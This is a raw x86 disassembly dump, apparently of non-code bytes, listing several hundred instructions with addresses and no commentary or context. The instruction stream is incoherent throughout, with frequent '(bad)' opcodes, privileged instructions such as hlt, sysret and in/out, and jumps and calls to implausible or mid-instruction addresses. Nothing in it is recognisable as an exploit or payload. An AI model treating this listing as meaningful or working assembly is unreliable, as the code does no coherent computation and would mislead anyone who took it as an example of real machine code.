  432537:	data16 xor bh,bl
  43253a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432540:	mov    esp,DWORD PTR [esi-0x14]
  432543:	fisttp WORD PTR [ebx-0x3748a9f2]
  432549:	or     al,0x2b
  43254b:	mov    bh,0xba
  43254d:	hlt    
  43254e:	mov    bh,bl
  432550:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432556:	dec    esi
  432557:	or     al,0x0
  432559:	mov    edi,DWORD PTR [ebx]
  43255b:	or     BYTE PTR [ebp+0x3b],dh
  43255e:	mov    ecx,DWORD PTR [edi]
  432560:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432566:	xor    al,0xd8
  432568:	pop    bp
  43256a:	lock xor esi,DWORD PTR [ebx]
  43256d:	lea    esp,[esi+0x1f]
  432570:	icebp  
  432571:	jb     0x432577
  432573:	add    al,al
  432575:	jge    0x432583
  432577:	mov    eax,eax
  432579:	fsubr  st,st(3)
  43257b:	pop    ebp
  43257c:	mov    esi,DWORD PTR [ebx]
  43257e:	in     al,0x8d
  432580:	rcr    DWORD PTR [edi],0xc2
  432583:	jb     0x4325e3
  432585:	add    cl,cl
  432587:	jge    0x432595
  432589:	mov    edx,DWORD PTR [ebp-0x20]
  43258c:	in     al,dx
  43258d:	pop    ebp
  43258e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432593:	cmp    di,WORD PTR [ebp+0x0]
  432597:	mov    ebp,DWORD PTR [ebx]
  432599:	fdivr  QWORD PTR [esi+0x668a5d]
  43259f:	cmp    al,0x33
  4325a1:	mov    si,0x4e7d
  4325a5:	mov    eax,DWORD PTR [eax]
  4325a7:	lock inc ebp
  4325a9:	mov    esi,DWORD PTR [eax]
  4325ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325b2:	clc    
  4325b3:	(bad)  
  4325b4:	cmp    edi,DWORD PTR [ebx]
  4325b6:	je     0x4325c7
  4325b8:	push   ebx
  4325b9:	loopne 0x4325ca
  4325bb:	dec    ecx
  4325bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4325c0:	int    0xf1
  4325c2:	mov    esi,0x703084d
  4325c7:	pcmpgtd mm6,mm1
  4325ca:	add    BYTE PTR [ebp+0x66],dh
  4325cd:	jmp    0x43259a
  4325cf:	mov    eax,DWORD PTR [ebx]
  4325d1:	lock push ebp
  4325d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325d9:	or     bh,dl
  4325db:	jb     0x4325db
  4325dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325e3:	loopne 0x4325e5
  4325e5:	jne    0x4325e9
  4325e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4325eb:	mov    ecx,ebx
  4325ed:	data16 cmp al,0xf1
  4325f0:	add    BYTE PTR [esi+eiz*2],bh
  4325f3:	add    bl,cl
  4325f5:	retw   0xf2
  4325f9:	ret    0x66
  4325fc:	retf   
  4325fd:	enterw 0x4df1,0x19
  432602:	pop    edi
  432603:	jne    0x432586
  432605:	mov    esi,DWORD PTR [eax]
  432607:	call   0x77b7b1a8
  43260c:	xor    ebp,DWORD PTR [ebx]
  43260e:	lea    esp,[esi+0x48]
  432611:	repnz in eax,0x3b
  432614:	add    BYTE PTR [ebp-0x37],dh
  432617:	xor    edx,DWORD PTR [ebp-0x15]
  43261a:	in     al,dx
  43261b:	xor    edx,DWORD PTR [esi+0x40]
  43261e:	mov    DWORD PTR [edi],0x338545fc
  432624:	clc    
  432625:	add    esi,DWORD PTR [ecx]
  432627:	pop    edi
  432628:	pushf  
  432629:	pop    ebx
  43262a:	call   0xff4425f1
  43262f:	mov    edi,eax
  432631:	push   ecx
  432632:	pop    es
  432633:	mov    edi,DWORD PTR [eax]
  432635:	push   esi
  432636:	inc    esi
  432637:	add    bh,BYTE PTR [esi+0x0]
  43263a:	popa   
  43263b:	data16 (bad) 
  43263d:	into   
  43263e:	gs cmp al,0xcd
  432641:	add    BYTE PTR [ecx+0x7ce0866],bh
  432647:	ret    0x66
  43264a:	add    bh,al
  43264c:	add    bh,ah
  43264e:	add    BYTE PTR [ebp+0x31c3f866],al
  432654:	cmp    al,0x9c
  432656:	add    BYTE PTR [esi+0x66],ah
  432659:	into   
  43265a:	ret    
  43265b:	pop    ebp
  43265c:	adc    BYTE PTR [edi+0x0],dl
  43265f:	mov    bh,0x66
  432661:	mov    edi,0xff038dc3
  432666:	jne    0x4326bc
  432668:	lea    edx,[ecx+0x1]
  43266b:	mov    ebx,0xd64ff1
  432670:	sar    DWORD PTR [ebx],1
  432672:	test   BYTE PTR [ebp+0x36],dh
  432675:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432679:	push   edi
  43267a:	xor    BYTE PTR [ebx],0x38
  43267d:	mov    esi,ebx
  43267f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432685:	ss inc ebp
  432687:	fs pop ebx
  432689:	mov    ebx,0x9c3b30
  43268e:	je     0x4326bb
  432690:	xor    edi,DWORD PTR [ebx+0x668a33]
  432696:	mov    WORD PTR [ebx],?
  432698:	ss mov ebx,0x8b4e64
  43269e:	pop    edi
  43269f:	cmp    ecx,ecx
  4326a1:	jne    0x4326f8
  4326a3:	mov    ebp,esp
  4326a5:	cld    
  4326a6:	push   esi
  4326a7:	pop    ebx
  4326a8:	inc    ebp
  4326a9:	stc    
  4326aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4326b0:	test   esi,ecx
  4326b2:	clc    
  4326b3:	test   dl,dl
  4326b5:	cmp    bh,bh
  4326b7:	fs pop si
  4326ba:	or     bl,al
  4326bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4326c2:	retf   0x3c45
  4326c5:	xor    BYTE PTR [eax],al
  4326c7:	pushf  
  4326c8:	mov    si,0x85ca
  4326cc:	ret    0xf8
  4326cf:	pop    ebx
  4326d0:	dec    dx
  4326d3:	mov    edx,DWORD PTR [edi-0x76]
  4326d6:	push   edi
  4326d7:	add    al,0xb7
  4326d9:	xor    al,0xba
  4326db:	cmp    al,0x8d
  4326dd:	je     0x4326de
  4326df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326e3:	lea    edi,[ebx+0x544fff]
  4326e9:	push   ecx
  4326ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4326ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326f3:	add    BYTE PTR [ebx],dh
  4326f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432702:	mov    ebx,0x3b3b00
  432707:	jne    0x432734
  432709:	mov    DWORD PTR [ebx+0x728afc],edi
  43270f:	xor    esi,DWORD PTR [ebx]
  432711:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432717:	push   edi
  432718:	cmp    esp,ebp
  43271a:	jne    0x43271c
  43271c:	sbb    DWORD PTR [eax],0x8085c3fc
  432722:	clc    
  432723:	inc    esi
  432724:	pop    ebx
  432725:	sti    
  432726:	add    eax,0xeb8bc075
  43272b:	cld    
  43272c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432732:	mov    ecx,DWORD PTR [ecx+edx*2]
  432735:	rol    DWORD PTR [ebp-0x37],0xf
  432739:	mov    DWORD PTR [eax],ecx
  43273b:	inc    edi
  43273c:	(bad)  
  43273d:	in     eax,0xfe
  43273f:	add    bh,bh
  432741:	(bad)  
  432742:	mov    esi,0xc38a5e
  432747:	mov    esi,DWORD PTR [ebx]
  432749:	push   ecx
  43274a:	mov    edi,0xfc4ec7
  43274f:	test   DWORD PTR [ebp-0x8],edx
  432752:	xor    di,ax
  432755:	pushf  
  432756:	sub    ebp,eax
  432758:	inc    ebp
  432759:	(bad)  
  43275a:	sub    edi,edi
  43275c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432762:	inc    ebp
  432763:	add    BYTE PTR [esi+0x2b],ah
  432766:	or     bh,BYTE PTR [edx+0xf8ac2]
  43276c:	cmp    al,0x33
  43276e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432774:	(bad)  
  432775:	cmp    esi,DWORD PTR [ebx]
  432777:	je     0x432731
  432779:	push   ebx
  43277a:	dec    esi
  43277b:	str    ecx
  43277e:	cmp    esp,DWORD PTR [ebp+0x75]
  432781:	int    0x33
  432783:	mov    edi,0x789085f
  432788:	mov    edx,DWORD PTR [eax]
  43278a:	cld    
  43278b:	add    cl,cl
  43278d:	data16 add al,0xcb
  432790:	push   ebp
  432791:	add    ebp,esp
  432793:	jne    0x432781
  432795:	(bad)  
  432796:	mov    DWORD PTR [ecx],0xd685f7ec
  43279c:	clc    
  43279d:	xlat   BYTE PTR ds:[ebx]
  43279e:	inc    ebp
  43279f:	mov    esi,DWORD PTR [edx]
  4327a1:	push   eax
  4327a2:	pushf  
  4327a3:	in     eax,0x8b
  4327a5:	add    ah,ch
  4327a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4327ab:	add    ax,0x72cb
  4327af:	cmp    al,0x0
  4327b1:	add    BYTE PTR [ebp+0x66],al
  4327b4:	(bad)  
  4327b5:	retf   
  4327b6:	lock ret 0x85
  4327ba:	clc    
  4327bb:	inc    bp
  4327bd:	retf   
  4327be:	cmp    eax,0xc77d9cc8
  4327c3:	xor    ah,bh
  4327c5:	pushf  
  4327c6:	test   DWORD PTR [edi-0x8],ebx
  4327c9:	je     0x432810
  4327cb:	xor    esi,DWORD PTR ds:0x7020840
  4327d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4327d5:	push   ebp
  4327d6:	add    esp,ebp
  4327d8:	jb     0x432765
  4327da:	add    BYTE PTR [eax],cl
  4327dc:	dec    ebp
  4327dd:	mov    bh,0x81
  4327df:	push   esi
  4327e0:	push   esp
  4327e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327e8:	xor    al,BYTE PTR [eax]
  4327ea:	mov    edx,DWORD PTR [edi+0x10]
  4327ed:	(bad)  
  4327ee:	scas   eax,DWORD PTR es:[edi]
  4327ef:	ret    0x3b
  4327f2:	jns    0x3b4424e5
  4327f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327fc:	dec    ebp
  4327fd:	or     BYTE PTR [ebx],ch
  4327ff:	ret    0x458b
  432802:	lock jmp 0x4327f6
  432805:	mov    ecx,DWORD PTR [eax]
  432807:	or     BYTE PTR [edi],al
  432809:	mov    ecx,eax
  43280b:	xor    DWORD PTR [edx+0x2],0x0
  43280f:	mov    bh,0xc1
  432811:	adc    BYTE PTR [eax],dh
  432813:	iret   
  432814:	inc    ebp
  432815:	mov    DWORD PTR [ebx],0x4dfff8c4
  43281b:	inc    BYTE PTR [ebx]
  43281d:	ret    0xf8
  432820:	adc    DWORD PTR [esi+0x10],esp
  432823:	clc    
  432824:	dec    ecx
  432825:	fisttp WORD PTR [ecx+0x456604c0]
  43282b:	add    dh,BYTE PTR ds:0x75e0845
  432831:	ret    0x4d
  432834:	lea    ecx,[ebx+0x18728301]
  43283a:	add    BYTE PTR [ebp+0x45],al
  43283d:	xor    ecx,ebp
  43283f:	pushf  
  432840:	add    bh,al
  432842:	add    al,ch
  432844:	inc    ebp
  432845:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43284b:	xor    eax,0x781084d
  432850:	push   esp
  432851:	fwait
  432852:	push   ecx
  432853:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432859:	inc    ebp
  43285a:	cmp    edi,DWORD PTR [ecx]
  43285c:	jbe    0x4327fa
  43285e:	mov    eax,edi
  432860:	or     ah,dh
  432862:	inc    ebp
  432863:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432869:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43286f:	in     al,dx
  432870:	hlt    
  432871:	push   esp
  432872:	push   esp
  432873:	push   ecx
  432874:	push   ecx
  432875:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43287b:	fwait
  43287c:	fwait
  43287d:	xor    dh,BYTE PTR [edx]
  43287f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432885:	or     BYTE PTR [ebp+0x7],al
  432888:	mov    eax,ecx
  43288a:	clc    
  43288b:	jb     0x43284e
  43288d:	add    BYTE PTR [ebp+0x55],cl
  432890:	or     DWORD PTR [edi],0xc251d154
  432896:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4328a0:	mov    edi,eax
  4328a2:	or     cl,al
  4328a4:	inc    ebp
  4328a5:	dec    ebp
  4328a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4328ac:	or     WORD PTR [ecx],0x899b
  4328b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328b7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ba:	mov    eax,DWORD PTR [ebp-0x8]
  4328bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328ca:	inc    ebp
  4328cb:	dec    eax
  4328cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328d2:	add    edx,DWORD PTR [ecx-0x8]
  4328d5:	mov    ecx,DWORD PTR [ecx]
  4328d7:	clc    
  4328d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328df:	mov    ecx,ebp
  4328e1:	clc    
  4328e2:	(bad)  
  4328e3:	popf   
  4328e4:	inc    DWORD PTR [eax]
  4328e6:	ret    0x8b
  4328e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328ef:	mov    edi,esp
  4328f1:	hlt    
  4328f2:	test   ecx,esi
  4328f4:	clc    
  4328f5:	or     BYTE PTR [ebp+0x7],al
  4328f8:	xor    al,cl
  4328fa:	pushf  
  4328fb:	jb     0x432930
  4328fd:	add    BYTE PTR [eax-0x3f],al
  432900:	inc    eax
  432901:	daa    
  432902:	inc    ebp
  432903:	inc    ebp
  432904:	xor    eax,0x7f80803
  432909:	dec    ebp
  43290a:	fwait
  43290b:	add    esi,DWORD PTR [edx]
  43290d:	clc    
  43290e:	cmp    DWORD PTR [ecx],ecx
  432910:	or     al,0x8
  432912:	add    al,BYTE PTR [ebp+0x2c]
  432915:	xor    eax,0x7350845
  43291a:	or     BYTE PTR [ebp+0x7],cl
  43291d:	lea    ebx,[ebx-0x748dcdff]
  432923:	add    BYTE PTR [eax*2-0x74b21438],cl
  43292a:	mov    edx,DWORD PTR [eax]
  43292c:	cld    
  43292d:	dec    ebp
  43292e:	push   esp
  43292f:	sub    edx,DWORD PTR [ecx-0x75]
  432932:	add    eax,0xf172fc
  432937:	or     BYTE PTR [ebp+0x7],cl
  43293a:	add    eax,ecx
  43293c:	or     al,0x72
  43293e:	add    DWORD PTR [eax],eax
  432940:	mov    ebx,0x29c2c1
  432945:	inc    ebp
  432946:	mov    eax,DWORD PTR [ebx]
  432948:	cmp    eax,0x3004d1c
  43294e:	xbegin 0x66c8b548
  432954:	clc    
  432955:	or     BYTE PTR [ebp+0x45],al
  432958:	xor    dh,BYTE PTR ds:0x78b089c
  43295e:	adc    BYTE PTR [ebp+0x45],cl
  432961:	lea    eax,[ebp+0x33727501]
  432967:	add    cl,ch
  432969:	inc    ebp
  43296a:	add    bl,ch
  43296c:	add    BYTE PTR [ebx+0x45850845],cl
  432972:	je     0x4328ff
  432974:	push   ebx
  432975:	or     al,0x85
  432977:	dec    ebp
  432978:	std    
  432979:	mov    bh,bh
  43297b:	mov    BYTE PTR [ebp-0x75],al
  43297e:	mov    edi,eax
  432980:	or     al,0x89
  432982:	inc    ebp
  432983:	clc    
  432984:	mov    esp,esp
  432986:	hlt    
  432987:	call   DWORD PTR [edi-0x37]
  43298a:	push   esp
  43298b:	or     al,0x51
  43298d:	push   ebp
  43298e:	xor    ebp,esp
  432990:	mov    esi,0x457251
  432995:	xor    esi,eax
  432997:	pushf  
  432998:	inc    ebp
  432999:	(bad)  
  43299a:	mov    edi,eax
  43299c:	or     al,0x85
  43299e:	add    al,bh
  4329a0:	inc    eax
  4329a2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329a6:	or     ah,bh
  4329a8:	inc    eax
  4329a9:	push   esp
  4329aa:	jmp    0x4329fd
  4329ac:	mov    eax,DWORD PTR ds:0xe8720c
  4329b2:	mov    DWORD PTR [ebp-0x8],eax
  4329b5:	jne    0x4329fc
  4329b7:	jmp    0x432944
  4329b9:	mov    ebp,DWORD PTR [eax]
  4329bb:	clc    
  4329bc:	retf   0xff54
  4329bf:	push   ecx
  4329c0:	mov    DWORD PTR ds:0x757210,eax
  4329c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329c9:	sub    esp,DWORD PTR [ebx-0x77]
  4329cc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329d3:	or     ah,bh
  4329d5:	pop    es
  4329d6:	ds fwait
  4329d8:	push   DWORD PTR [edx]
  4329da:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329e0:	(bad)  
  4329e1:	mov    bh,bh
  4329e3:	jmp    0x4329d1
  4329e5:	leave  
  4329e6:	jne    0x4329f0
  4329e8:	call   0x302342
  4329ed:	in     al,dx
  4329ee:	dec    ebp
  4329ef:	add    dh,BYTE PTR [ebx]
  4329f1:	add    BYTE PTR [ebx],al
  4329f3:	inc    ebp
  4329f4:	cmp    esi,DWORD PTR [ecx]
  4329f6:	je     0x432994
  4329f8:	mov    eax,edi
  4329fa:	or     al,0xf0
  4329fc:	add    BYTE PTR [ebp+0x458bf845],al
  432a02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a08:	adc    al,0x7
  432a0a:	enter  0x9fc0,0xa5
  432a0e:	rol    BYTE PTR [eax],0x5e
  432a11:	mov    ecx,ecx
  432a13:	or     al,0xc
  432a15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a1c:	jmp    0x432a1d
  432a1e:	push   ebp
  432a1f:	mov    esp,ebp
  432a21:	cld    
  432a22:	inc    ebp
  432a23:	inc    ebp
  432a24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a2b:	push   esi
  432a2c:	push   esi
  432a2d:	mov    edi,0x7af080f
  432a32:	add    bh,al
  432a34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a40:	mov    ebp,eax
  432a42:	mov    ebp,edi
  432a44:	lock call edx
  432a47:	fcom   DWORD PTR [ebp+0x45]
  432a4a:	mov    eax,0x148a8b
  432a4f:	push   ecx
  432a50:	enter  0xc145,0x83
  432a54:	cmp    ecx,DWORD PTR [eax]
  432a56:	add    BYTE PTR [ebp+0x4d],al
  432a59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a5f:	call   0xffa325ce
  432a64:	cmp    eax,DWORD PTR [ebp-0xc]
  432a67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a6b:	push   ebp
  432a6c:	(bad)  
  432a6d:	call   0x342871
  432a72:	mov    bh,0xdb
  432a74:	cld    
  432a75:	or     BYTE PTR [ebp+0x45],bl
  432a78:	(bad)  
  432a79:	call   0xff7d2709
  432a7e:	add    al,BYTE PTR [ebp+0x37]
  432a81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a87:	jne    0x432a89
  432a89:	(bad)  
  432a8a:	cmp    edi,esp
  432a8c:	jne    0x432abf
  432a8e:	mov    edi,edi
  432a90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a96:	pop    ds
  432a97:	into   
  432a98:	je     0x432a5b
  432a9a:	mov    ebx,DWORD PTR [esi]
  432a9c:	or     BYTE PTR [ebp-0x49],al
  432a9f:	mov    esp,DWORD PTR [esi-0x77]
  432aa2:	mov    esi,0x2451f0c
  432aa7:	mov    eax,DWORD PTR [eax]
  432aa9:	or     al,0x66
  432aab:	sar    bl,0x3b
  432aae:	xor    esi,DWORD PTR [ebp+0x66]
  432ab1:	xor    ecx,edi
  432ab3:	pop    edi
  432ab4:	adc    bl,BYTE PTR [ebx+0x7e]
  432ab7:	ret    0xff
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432ac2:	cld    
  432ac3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432aca:	push   0xffffff83
  432acc:	pop    edi
  432acd:	or     BYTE PTR [ebp+0x53],dh
  432ad0:	xorps  xmm1,xmm2
  432ad3:	test   BYTE PTR [eax+eax*1],bh
  432ad6:	add    BYTE PTR [eax],al
  432ad8:	adc    eax,eax
  432ada:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ae2:	jmp    DWORD PTR [eax]
  432ae4:	ror    al,0x5e
  432ae7:	inc    ebp
  432ae8:	leave  
  432ae9:	xor    ecx,DWORD PTR [eax]
  432aeb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432af1:	add    ah,al
  432af3:	xor    edi,edi
  432af5:	xor    DWORD PTR [ebx],0x66003302
  432afb:	mov    DWORD PTR [ebp-0xc],ecx
  432afe:	pcmpgtw mm0,mm0
  432b01:	add    dl,ah
  432b03:	leave  
  432b04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b08:	push   eax
  432b09:	dec    ebp
  432b0a:	mov    esi,DWORD PTR [ebx-0x75]
  432b0d:	lea    ebp,[eax-0x7c00ff02]
  432b13:	xor    eax,DWORD PTR [eax]
  432b15:	sysret 
  432b17:	dec    ebp
  432b18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b1f:	push   WORD PTR [ecx+0x8]
  432b23:	jne    0x432ae6
  432b25:	ud0    ecx,DWORD PTR [ecx]
  432b28:	mov    eax,edx
  432b2a:	lods   al,BYTE PTR ds:[esi]
  432b2b:	add    BYTE PTR [eax],al
  432b2d:	data16 (bad) 
  432b2f:	iret   
  432b30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b37:	cli    
  432b38:	inc    ebp
  432b39:	cmp    al,0x8d
  432b3b:	add    BYTE PTR [esi+0x2d],ah
  432b3e:	inc    ebp
  432b3f:	pop    ebp
  432b40:	lea    ecx,[edi]
  432b42:	mov    dl,bh
  432b44:	add    BYTE PTR [edi],cl
  432b46:	mov    DWORD PTR [eax+eax*8],edi
  432b49:	mov    ebx,0x3b87
  432b4e:	add    BYTE PTR [ebx],ch
  432b50:	inc    ebp
  432b51:	data16 (bad) 
  432b53:	clc    
  432b54:	int3   
  432b55:	cmp    eax,DWORD PTR [eax]
  432b57:	je     0x432ae2
  432b59:	push   0xffffffc8
  432b5b:	pop    edi
  432b5c:	xchg   DWORD PTR [ebp+0x0],eax
  432b5f:	data16 add BYTE PTR [ebp+0x45],cl
  432b63:	lea    cx,[ebp+0x10]
  432b67:	jb     0x432b69
  432b69:	jmp    0x432af4
  432b6b:	call   eax
  432b6d:	clc    
  432b6e:	xchg   DWORD PTR [edi+0x1],edi
  432b71:	mov    eax,DWORD PTR [eax]
  432b73:	or     BYTE PTR [ebp-0x49],al
  432b76:	lea    eax,[eax+0x74003154]
  432b7c:	push   edi
  432b7d:	inc    edx
  432b7e:	jge    0x432b7f
  432b80:	mov    DWORD PTR [edi],ecx
  432b82:	fdiv   DWORD PTR [edi-0x6]
  432b85:	inc    DWORD PTR [eax]
  432b87:	xor    edx,DWORD PTR [eax+0x5f]
  432b8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432b8d:	ret    0x0
  432b90:	xor    BYTE PTR [ebp-0x51],cl
  432b93:	cmp    edi,0xf0ff89fe
  432b99:	data16 ror al,0x84
  432b9d:	rol    BYTE PTR [eax],0x3b
  432ba0:	add    al,dh
  432ba2:	dec    eax
  432ba3:	xchg   esp,eax
  432ba4:	push   ebx
  432ba5:	jmp    0x432b32
  432ba7:	push   ebp
  432ba8:	add    esp,ebp
  432baa:	add    ebp,esp
  432bac:	mov    edx,DWORD PTR [edi+0x24]
  432baf:	clc    
  432bb0:	dec    esi
  432bb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432bb7:	cmp    BYTE PTR [ebx],al
  432bb9:	jne    0x432b44
  432bbb:	xor    esp,eax
  432bbd:	jmp    0x462d40
  432bc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bc5:	jne    0x432bbb
  432bc7:	call   0xffcd2921
  432bcc:	clc    
  432bcd:	xchg   edi,eax
  432bce:	sti    
  432bcf:	add    DWORD PTR [ebx],eax
  432bd1:	add    BYTE PTR [ebp+0x47],bl
  432bd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bda:	pop    ebp
  432bdb:	mov    DWORD PTR [esi-0x48],esi
  432bde:	jmp    0x432c27
  432be0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432be6:	(bad)  
  432be8:	cmp    al,0x0
  432bea:	cmp    eax,DWORD PTR [ebp+0x18]
  432bed:	lea    ebx,[ebp-0x56]
  432bf0:	jle    0x432bf2
  432bf2:	jae    0x432b7d
  432bf4:	mov    eax,esp
  432bf6:	call   0xb900:0x8b005587
  432bfd:	inc    ebp
  432bfe:	push   ebp
  432bff:	lea    ecx,[ebp-0x27ff4f12]
  432c05:	mov    eax,edi
  432c07:	int3   
  432c08:	push   ebp
  432c09:	xchg   edi,eax
  432c0b:	add    esp,ebp
  432c0d:	add    BYTE PTR [eax],al
  432c0f:	inc    ebp
  432c10:	add    BYTE PTR [ebp+0x8b3255],cl
  432c16:	cld    
  432c17:	mov    DWORD PTR [edx],edi
  432c19:	aam    0x75
  432c1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c21:	mov    DWORD PTR [ebx-0x50],edx
  432c24:	test   BYTE PTR [ebp-0x1],0xe8
  432c28:	mov    eax,DWORD PTR [eax]
  432c2a:	hlt    
  432c2b:	add    al,al
  432c2d:	mov    eax,DWORD PTR ds:0x890045a8
  432c33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c39:	inc    DWORD PTR [eax*2+0xf75854d]
  432c40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c46:	call   0x72998987
  432c4b:	je     0x432cab
  432c4d:	js     0x432cae
  432c4f:	lock ret 0x7e
  432c53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c59:	mov    edi,edi
  432c5b:	sbb    al,bl
  432c5d:	clc    
  432c5e:	add    BYTE PTR [ebp-0x73],bh
  432c61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c67:	ror    BYTE PTR [eax],1
  432c69:	dec    ebp
  432c6a:	xchg   ebp,eax
  432c6b:	mov    edi,edi
  432c6d:	in     al,0x8b
  432c6f:	jge    0x432bfa
  432c71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c77:	clc    
  432c78:	pop    esi
  432c79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c7f:	clc    
  432c80:	add    al,0x6e
  432c82:	mov    eax,DWORD PTR [ebx]
  432c84:	mov    BYTE PTR [ebp+0x0],dl
  432c87:	mov    edx,DWORD PTR [ebx-0x20]
  432c8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c90:	add    eax,0x3b3b73
  432c95:	adc    al,0x89
  432c97:	pop    eax
  432c98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c9c:	ret    0xf08
  432c9f:	cmp    al,0x2
  432ca1:	mov    edx,eax
  432ca3:	cld    
  432ca4:	add    BYTE PTR [ebp+0x66],dl
  432ca7:	add    eax,ebx
  432ca9:	add    esp,eax
  432cab:	sub    eax,eax
  432cad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432cb3:	add    BYTE PTR [eax],al
  432cb5:	mov    DWORD PTR [ebx-0x24],ebx
  432cb8:	push   edi
  432cb9:	push   ebp
  432cba:	clc    
  432cbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cc2:	out    0xff,eax
  432cc4:	add    edx,DWORD PTR [eax]
  432cc6:	jmp    0x432cb0
  432cc8:	cmp    ch,0x46
  432ccb:	(bad)  
  432ccc:	jmp    0x40c8b51e
  432cd1:	je     0x432c5d
  432cd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cd9:	inc    ebp
  432cda:	add    BYTE PTR [ebx-0x770375],al
  432ce0:	add    ah,ch
  432ce2:	add    edx,esp
  432ce4:	pop    edi
  432ce5:	pop    ebp
  432ce6:	push   ebp
  432ce7:	inc    ebx
  432ce8:	in     al,dx
  432ce9:	pop    ebp
  432cea:	in     al,dx
  432ceb:	cmp    edx,DWORD PTR [edi-0x8]
  432cee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432cf5:	add    al,0x47
  432cf7:	push   ebp
  432cf8:	mov    esp,ebp
  432cfa:	in     al,0x45
  432cfc:	dec    ebp
  432cfd:	push   esi
  432cfe:	test   DWORD PTR [eax+0xfb010f],esi
  432d04:	add    BYTE PTR [eax+0xc018b],dh
  432d0a:	leave  
  432d0b:	inc    ebp
  432d0c:	test   al,ch
  432d0e:	add    dh,bh
  432d10:	add    bh,bh
  432d12:	dec    ebp
  432d13:	push   cs
  432d14:	mov    DWORD PTR [ecx],eax
  432d16:	hlt    
  432d17:	push   es
  432d18:	dec    ebp
  432d19:	leave  
  432d1a:	mov    DWORD PTR [eax],ecx
  432d1c:	clc    
  432d1d:	cmovge eax,ecx
  432d20:	mov    ecx,0x85c2f0
  432d26:	clc    
  432d27:	pop    DWORD PTR [ebp+0x1]
  432d2a:	push   ebx
  432d2b:	add    BYTE PTR [ebp-0x15],bh
  432d2e:	push   esi
  432d2f:	xor    eax,0x898a45
  432d34:	cld    
  432d35:	add    al,BYTE PTR [ebp+0x0]
  432d38:	xor    esp,DWORD PTR [esi-0x64]
  432d3b:	add    DWORD PTR [esi+0x78308c1],edi
  432d41:	add    ah,BYTE PTR [ebp-0x49]
  432d44:	int    0xbb
